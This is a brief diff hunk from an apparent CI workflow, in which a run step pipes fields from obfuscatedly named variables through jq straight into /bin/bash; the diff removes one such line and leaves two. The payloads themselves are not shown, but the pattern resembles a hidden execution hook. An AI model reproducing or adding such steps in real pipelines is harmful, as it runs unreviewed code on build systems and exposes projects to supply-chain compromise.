@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$avb8" | jq -r .x7949 | /bin/bash
           echo $vesy259 | jq -r .sdslp1 | /bin/bash
-          echo $foqp7699 | jq -r .chhf02402 | /bin/bash
 
       - name: Save results
         if: always()
